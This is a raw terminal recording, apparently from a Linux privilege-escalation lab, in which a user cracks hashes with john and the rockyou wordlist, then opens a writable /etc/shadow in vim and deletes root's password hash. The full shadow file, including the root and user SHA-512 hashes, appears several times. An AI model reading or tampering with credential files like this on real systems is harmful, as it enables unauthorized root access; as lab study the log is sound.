:0:99999:7:::[35;129H111[1;111H[?12l[?25h[?25l.:0:99999:7:[1;124H[K[1;111H[?12l[?25h[35;1H[K[1;110H[?25l[35;127H1,110[9CAll[1;110H[?12l[?25h[?25l[35;127H[K[35;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h[?25l"/etc/shadow" 24L, 838C written
+[?1l>[?12l[?25h[?1049lroot@debian:/home/user# exit
+exit
+]0;user@debian: ~user@debian:~$ su root
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ su root[3Pexitls /usr/share/john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cnano hash.txt[K[44@john --wordlist=/usr/share/wordlists/rockyou.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls /usr/share/[Kexit[Ksu root[Kvim /w[Ketc/shadow
+[?1049h[?1h=[1;35r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[35;1H"/etc/shadow" 24L, 838C[>c[1;1Hroot:$6$aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+[94m~                                                                                                                                               [26;1H~                                                                                                                                               [27;1H~                                                                                                                                               [28;1H~                                                                                                                                               [29;1H~                                                                                                                                               [30;1H~                                                                                                                                               [31;1H~                                                                                                                                               [32;1H~                                                                                                                                               [33;1H~                                                                                                                                               [34;1H~                                                                                                                                               [m[35;127H1,1[11CAll[1;1H[?12l[?25h[?25l[35;129H2[1;2H[?12l[?25h[?25l[35;129H3[1;3H[?12l[?25h[?25l[35;129H4[1;4H[?12l[?25h[?25l[35;129H5[1;5H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l[35;129H7[1;7H[?12l[?25h[?25l[35;129H8[1;8H[?12l[?25h[?25l[35;129H9[1;9H[?12l[?25h[?25l[35;129H10[1;10H[?12l[?25h[?25l[35;130H1[1;11H[?12l[?25h[?25l[35;130H2[1;12H[?12l[?25h[?25l[35;130H3[1;13H[?12l[?25h[?25l[35;130H4[1;14H[?12l[?25h[?25l[35;130H5[1;15H[?12l[?25h[?25l[35;130H6[1;16H[?12l[?25h[?25l[35;130H7[1;17H[?12l[?25h[?25l[35;130H8[1;18H[?12l[?25h[?25l[35;130H9[1;19H[?12l[?25h[?25l[35;129H20[1;20H[?12l[?25h[?25l[35;130H1[1;21H[?12l[?25h[?25l[35;130H2[1;22H[?12l[?25h[?25l[35;130H3[1;23H[?12l[?25h[?25l[35;130H4[1;24H[?12l[?25h[?25l[35;130H5[1;25H[?12l[?25h[?25l[35;130H6[1;26H[?12l[?25h[?25l[35;130H7[1;27H[?12l[?25h[?25l[35;130H8[1;28H[?12l[?25h[?25l[35;130H9[1;29H[?12l[?25h[?25l[35;129H30[1;30H[?12l[?25h[?25l[35;130H1[1;31H[?12l[?25h[?25l[35;130H2[1;32H[?12l[?25h[?25l[35;130H3[1;33H[?12l[?25h[?25l[35;130H4[1;34H[?12l[?25h[?25l[35;130H5[1;35H[?12l[?25h[?25l[35;130H6[1;36H[?12l[?25h[?25l[35;130H7[1;37H[?12l[?25h[?25l[35;130H8[1;38H[?12l[?25h[?25l[35;130H9[1;39H[?12l[?25h[?25l[35;129H40[1;40H[?12l[?25h[?25l[35;130H1[1;41H[?12l[?25h[?25l[35;130H2[1;42H[?12l[?25h[?25l[35;130H3[1;43H[?12l[?25h[?25l[35;130H4[1;44H[?12l[?25h[?25l[35;130H5[1;45H[?12l[?25h[?25l[35;130H6[1;46H[?12l[?25h[?25l[35;130H7[1;47H[?12l[?25h[?25l[35;130H8[1;48H[?12l[?25h[?25l[35;130H9[1;49H[?12l[?25h[?25l[35;129H50[1;50H[?12l[?25h[?25l[35;130H1[1;51H[?12l[?25h[?25l[35;130H2[1;52H[?12l[?25h[?25l[35;130H3[1;53H[?12l[?25h[?25l[35;130H4[1;54H[?12l[?25h[?25l[35;130H5[1;55H[?12l[?25h[?25l[35;130H6[1;56H[?12l[?25h[?25l[35;130H7[1;57H[?12l[?25h[?25l[35;130H8[1;58H[?12l[?25h[?25l[35;130H9[1;59H[?12l[?25h[?25l[35;129H60[1;60H[?12l[?25h[?25l[35;130H1[1;61H[?12l[?25h[?25l[35;130H2[1;62H[?12l[?25h[?25l[35;130H3[1;63H[?12l[?25h[?25l[35;130H4[1;64H[?12l[?25h[?25l[35;130H5[1;65H[?12l[?25h[?25l[35;130H6[1;66H[?12l[?25h[?25l[35;130H7[1;67H[?12l[?25h[?25l[35;130H8[1;68H[?12l[?25h[?25l[35;130H9[1;69H[?12l[?25h[?25l[35;129H70[1;70H[?12l[?25h[?25l[35;130H1[1;71H[?12l[?25h[?25l[35;130H2[1;72H[?12l[?25h[?25l[35;130H3[1;73H[?12l[?25h[?25l[35;130H4[1;74H[?12l[?25h[?25l[35;130H5[1;75H[?12l[?25h[?25l[35;130H6[1;76H[?12l[?25h[?25l[35;130H7[1;77H[?12l[?25h[?25l[35;130H8[1;78H[?12l[?25h[?25l[35;130H9[1;79H[?12l[?25h[?25l[35;129H80[1;80H[?12l[?25h[?25l[35;130H1[1;81H[?12l[?25h[?25l[35;130H2[1;82H[?12l[?25h[?25l[35;130H3[1;83H[?12l[?25h[?25l[35;130H4[1;84H[?12l[?25h[?25l[35;130H5[1;85H[?12l[?25h[?25l[35;130H6[1;86H[?12l[?25h[?25l[35;130H7[1;87H[?12l[?25h[?25l[35;130H8[1;88H[?12l[?25h[?25l[35;130H9[1;89H[?12l[?25h[?25l[35;129H90[1;90H[?12l[?25h[?25l[35;130H1[1;91H[?12l[?25h[?25l[35;130H2[1;92H[?12l[?25h[?25l[35;130H3[1;93H[?12l[?25h[?25l[35;130H4[1;94H[?12l[?25h[?25l[35;130H5[1;95H[?12l[?25h[?25l[35;130H6[1;96H[?12l[?25h[?25l[35;130H7[1;97H[?12l[?25h[?25l[35;130H8[1;98H[?12l[?25h[?25l[35;130H9[1;99H[?12l[?25h[?25l[35;129H100[1;100H[?12l[?25h[?25l[35;131H1[1;101H[?12l[?25h[?25l[35;131H2[1;102H[?12l[?25h[?25l[35;131H3[1;103H[?12l[?25h[?25l[35;131H4[1;104H[?12l[?25h[?25l[35;131H5[1;105H[?12l[?25h[?25l[35;131H6[1;106H[?12l[?25h[?25l[35;131H7[1;107H[?12l[?25h[?25l[35;131H8[1;108H[?12l[?25h[?25l[35;131H9[1;109H[?12l[?25h[?25l[35;130H10[1;110H[?12l[?25h[?25l[35;131H1[1;111H[?12l[?25h[?25l[35;131H2[1;112H[?12l[?25h[?25l[35;131H3[1;113H[?12l[?25h[?25l[35;131H2[1;112H[?12l[?25h[?25l[35;131H1[1;111H[?12l[?25h[?25l[35;131H0[1;110H[?12l[?25h[?25l[35;131H1[1;111H[?12l[?25h[?25l[35;1H[1m-- VISUAL --[m[35;13H[K[35;127H1,111[9CAll[1;111H[?12l[?25h[?25l[47m:[m[35;131H2[1;112H[?12l[?25h[?25l[47m0[m[35;131H3[1;113H[?12l[?25h[?25l[47m:[m[35;131H4[1;114H[?12l[?25h[?25l[47m9[m[35;131H5[1;115H[?12l[?25h[?25l[47m9[m[35;131H6[1;116H[?12l[?25h[?25l[47m9[m[35;131H7[1;117H[?12l[?25h[?25l[47m9[m[35;131H8[1;118H[?12l[?25h[?25l[47m9[m[35;131H9[1;119H[?12l[?25h[?25l[47m:[m[35;130H20[1;120H[?12l[?25h[?25l[47m7[m[35;131H1[1;121H[?12l[?25h[?25l[47m:[m[35;131H2[1;122H[?12l[?25h[?25l[47m:[m[35;131H3[1;123H[?12l[?25h[?25l[47m:[m[35;131H4[1;124H[?12l[?25h[?25l[?12l[?25h[?25l[1;34r[34;1H
+[1;35r[1;1Hroot:$6$aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.daemon:*:17298:0:99999:7:::[34;1H[94m~                                                                                                                                               [m[35;1H[K[35;127H1,111[9CAll[1;111H[?12l[?25h[?25l[35;1H[1m-- INSERT --[m[35;127H[K[35;127H1,111[9CAll[1;111H[?12l[?25h[?25l[2;34r[2;1H[L[1;35r[1;111H[K[2;1Hdaemon:*:17298:0:99999:7:::[35;127H[K[35;127H2,1[11CAll[2;1H[?12l[?25h[?25l[35;127H1[1;1H[?12l[?25h[?25l[35;129H2[1;2H[?12l[?25h[?25l[35;129H3[1;3H[?12l[?25h[?25l[35;129H4[1;4H[?12l[?25h[?25l[35;129H5[1;5H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l[35;129H7[1;7H[?12l[?25h[?25l[35;129H8[1;8H[?12l[?25h[?25l[35;129H9[1;9H[?12l[?25h[?25l[35;129H10[1;10H[?12l[?25h[?25l[35;130H1[1;11H[?12l[?25h[?25l[35;130H2[1;12H[?12l[?25h[?25l[35;130H3[1;13H[?12l[?25h[?25l[35;130H4[1;14H[?12l[?25h[?25l[35;130H5[1;15H[?12l[?25h[?25l[35;130H6[1;16H[?12l[?25h[?25l[35;130H7[1;17H[?12l[?25h[?25l[35;130H8[1;18H[?12l[?25h[?25l[35;130H9[1;19H[?12l[?25h[?25l[35;129H20[1;20H[?12l[?25h[?25l[35;130H1[1;21H[?12l[?25h[?25l[35;130H2[1;22H[?12l[?25h[?25l[35;130H3[1;23H[?12l[?25h[?25l[35;130H4[1;24H[?12l[?25h[?25l[35;130H5[1;25H[?12l[?25h[?25l[35;130H6[1;26H[?12l[?25h[?25l[35;130H7[1;27H[?12l[?25h[?25l[35;130H8[1;28H[?12l[?25h[?25l[35;130H9[1;29H[?12l[?25h[?25l[35;129H30[1;30H[?12l[?25h[?25l[35;130H1[1;31H[?12l[?25h[?25l[35;130H2[1;32H[?12l[?25h[?25l[35;130H3[1;33H[?12l[?25h[?25l[35;130H4[1;34H[?12l[?25h[?25l[35;130H5[1;35H[?12l[?25h[?25l[35;130H6[1;36H[?12l[?25h[?25l[35;130H7[1;37H[?12l[?25h[?25l[35;130H8[1;38H[?12l[?25h[?25l[35;130H9[1;39H[?12l[?25h[?25l[35;129H40[1;40H[?12l[?25h[?25l[35;130H1[1;41H[?12l[?25h[?25l[35;130H2[1;42H[?12l[?25h[?25l[35;130H3[1;43H[?12l[?25h[?25l[35;130H4[1;44H[?12l[?25h[?25l[35;130H5[1;45H[?12l[?25h[?25l[35;130H6[1;46H[?12l[?25h[?25l[35;130H7[1;47H[?12l[?25h[?25l[35;130H8[1;48H[?12l[?25h[?25l[35;130H9[1;49H[?12l[?25h[?25l[35;129H50[1;50H[?12l[?25h[?25l[35;130H1[1;51H[?12l[?25h[?25l[35;130H2[1;52H[?12l[?25h[?25l[35;130H3[1;53H[?12l[?25h[?25l[35;130H4[1;54H[?12l[?25h[?25l[35;130H5[1;55H[?12l[?25h[?25l[35;130H6[1;56H[?12l[?25h[?25l[35;130H7[1;57H[?12l[?25h[?25l[35;130H8[1;58H[?12l[?25h[?25l[35;130H9[1;59H[?12l[?25h[?25l[35;129H60[1;60H[?12l[?25h[?25l[35;130H1[1;61H[?12l[?25h[?25l[35;130H2[1;62H[?12l[?25h[?25l[35;130H3[1;63H[?12l[?25h[?25l[35;130H4[1;64H[?12l[?25h[?25l[35;130H5[1;65H[?12l[?25h[?25l[35;130H6[1;66H[?12l[?25h[?25l[35;130H7[1;67H[?12l[?25h[?25l[35;130H8[1;68H[?12l[?25h[?25l[35;130H9[1;69H[?12l[?25h[?25l[35;129H70[1;70H[?12l[?25h[?25l[35;130H1[1;71H[?12l[?25h[?25l[35;130H2[1;72H[?12l[?25h[?25l[35;130H3[1;73H[?12l[?25h[?25l[35;130H4[1;74H[?12l[?25h[?25l[35;130H5[1;75H[?12l[?25h[?25l[35;130H6[1;76H[?12l[?25h[?25l[35;130H7[1;77H[?12l[?25h[?25l[35;130H8[1;78H[?12l[?25h[?25l[35;130H9[1;79H[?12l[?25h[?25l[35;129H80[1;80H[?12l[?25h[?25l[35;130H1[1;81H[?12l[?25h[?25l[35;130H2[1;82H[?12l[?25h[?25l[35;130H3[1;83H[?12l[?25h[?25l[35;130H4[1;84H[?12l[?25h[?25l[35;130H5[1;85H[?12l[?25h[?25l[35;130H6[1;86H[?12l[?25h[?25l[35;130H7[1;87H[?12l[?25h[?25l[35;130H8[1;88H[?12l[?25h[?25l[35;130H9[1;89H[?12l[?25h[?25l[35;129H90[1;90H[?12l[?25h[?25l[35;130H1[1;91H[?12l[?25h[?25l[35;130H2[1;92H[?12l[?25h[?25l[35;130H3[1;93H[?12l[?25h[?25l[35;130H4[1;94H[?12l[?25h[?25l[35;130H5[1;95H[?12l[?25h[?25l[35;130H6[1;96H[?12l[?25h[?25l[35;130H7[1;97H[?12l[?25h[?25l[35;130H8[1;98H[?12l[?25h[?25l[35;130H9[1;99H[?12l[?25h[?25l[35;129H100[1;100H[?12l[?25h[?25l[35;131H1[1;101H[?12l[?25h[?25l[35;131H2[1;102H[?12l[?25h[?25l[35;131H3[1;103H[?12l[?25h[?25l[35;131H4[1;104H[?12l[?25h[?25l[35;131H5[1;105H[?12l[?25h[?25l[35;131H6[1;106H[?12l[?25h[?25l[35;131H7[1;107H[?12l[?25h[?25l[35;131H8[1;108H[?12l[?25h[?25l[35;131H9[1;109H[?12l[?25h[?25l[35;130H10[1;110H[?12l[?25h[?25l[35;131H1[1;111H[?12l[?25h[35;1H[K[1;110H[?25l[35;127H1,110[9CAll[1;110H[?12l[?25h[?25l[35;1H1 line less; before #2  12 seconds ago[35;127H[K[1;34r[34;1H
+[1;35r[1;1Hroot:$6$aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.daemon:*:17298:0:99999:7:::[34;1H[94m~                                                                                                                                               [m[35;1H[K[35;127H1,111[9CAll[1;111H[?12l[?25h[?25l[35;1H1 more line; before #1  17 seconds ago[35;127H[K[2;34r[2;1H[L[1;35r[1;110H.:0:99999:7:::[1;124H[K[2;1Hdaemon:*:17298:0:99999:7:::[35;1H[K[35;127H1,111[9CAll[1;111H[?12l[?25h[?25l[35;1HAlready at oldest change[35;127H[K[35;127H1,111[9CAll[1;111H[?12l[?25h[?25l[35;131H0[1;110H[?12l[?25h[?25l[35;1H[K[35;1H:[?12l[?25hq[?25l[?12l[?25h[?25l[35;1H[K[35;1H[?1l>[?12l[?25h[?1049l]0;user@debian: ~user@debian:~$ su root
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ su root
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ e[Ksu rootvim /etc/shadow
+[?1049h[?1h=[1;35r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[35;1H"/etc/shadow" 24L, 838C[>c[1;1Hroot:$6$aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+[94m~                                                                                                                                               [26;1H~                                                                                                                                               [27;1H~                                                                                                                                               [28;1H~                                                                                                                                               [29;1H~                                                                                                                                               [30;1H~                                                                                                                                               [31;1H~                                                                                                                                               [32;1H~                                                                                                                                               [33;1H~                                                                                                                                               [34;1H~                                                                                                                                               [m[35;127H1,1[11CAll[1;1H[?12l[?25h[?25l[35;129H2[1;2H[?12l[?25h[?25l[35;129H3[1;3H[?12l[?25h[?25l[35;129H4[1;4H[?12l[?25h[?25l[35;129H5[1;5H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l:6$aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;123H[K[1;6H[?12l[?25h[?25l:$aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;122H[K[1;6H[?12l[?25h[?25l:aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;121H[K[1;6H[?12l[?25h[?25l:MuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;120H[K[1;6H[?12l[?25h[?25l:uK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;119H[K[1;6H[?12l[?25h[?25l:K.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;118H[K[1;6H[?12l[?25h[?25l:.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;117H[K[1;6H[?12l[?25h[?25l:Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;116H[K[1;6H[?12l[?25h[?25l:gxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;115H[K[1;6H[?12l[?25h[?25l:xm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;114H[K[1;6H[?12l[?25h[?25l:m4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;113H[K[1;6H[?12l[?25h[?25l:4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;112H[K[1;6H[?12l[?25h[?25l:yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;111H[K[1;6H[?12l[?25h[?25l:t6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;110H[K[1;6H[?12l[?25h[?25l:6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;109H[K[1;6H[?12l[?25h[?25l:vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;108H[K[1;6H[?12l[?25h[?25l:E$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;107H[K[1;6H[?12l[?25h[?25l:$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;106H[K[1;6H[?12l[?25h[?25l:g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;105H[K[1;6H[?12l[?25h[?25l:70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;104H[K[1;6H[?12l[?25h[?25l:0MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;103H[K[1;6H[?12l[?25h[?25l:MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;102H[K[1;6H[?12l[?25h[?25l:pLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;101H[K[1;6H[?12l[?25h[?25l:LOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;100H[K[1;6H[?12l[?25h[?25l:OjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;99H[K[1;6H[?12l[?25h[?25l:jmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;98H[K[1;6H[?12l[?25h[?25l:mJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;97H[K[1;6H[?12l[?25h[?25l:JzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;96H[K[1;6H[?12l[?25h[?25l:zUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;95H[K[1;6H[?12l[?25h[?25l:Uwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;94H[K[1;6H[?12l[?25h[?25l:wf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;93H[K[1;6H[?12l[?25h[?25l:f5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;92H[K[1;6H[?12l[?25h[?25l:5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;91H[K[1;6H[?12l[?25h[?25l:Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;90H[K[1;6H[?12l[?25h[?25l:bv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;89H[K[1;6H[?12l[?25h[?25l:v9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;88H[K[1;6H[?12l[?25h[?25l:9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;87H[K[1;6H[?12l[?25h[?25l:Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;86H[K[1;6H[?12l[?25h[?25l:6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;85H[K[1;6H[?12l[?25h[?25l:jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;84H[K[1;6H[?12l[?25h[?25l:qIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;83H[K[1;6H[?12l[?25h[?25l:Ife5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;82H[K[1;6H[?12l[?25h[?25l:fe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;81H[K[1;6H[?12l[?25h[?25l:e5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;80H[K[1;6H[?12l[?25h[?25l:5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;79H[K[1;6H[?12l[?25h[?25l:wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;78H[K[1;6H[?12l[?25h[?25l:zIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;77H[K[1;6H[?12l[?25h[?25l:IuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;76H[K[1;6H[?12l[?25h[?25l:uBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;75H[K[1;6H[?12l[?25h[?25l:BuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;74H[K[1;6H[?12l[?25h[?25l:uXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;73H[K[1;6H[?12l[?25h[?25l:XJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;72H[K[1;6H[?12l[?25h[?25l:Ja/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;71H[K[1;6H[?12l[?25h[?25l:a/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;70H[K[1;6H[?12l[?25h[?25l:/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;69H[K[1;6H[?12l[?25h[?25l:MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;68H[K[1;6H[?12l[?25h[?25l:HWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;67H[K[1;6H[?12l[?25h[?25l:WQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;66H[K[1;6H[?12l[?25h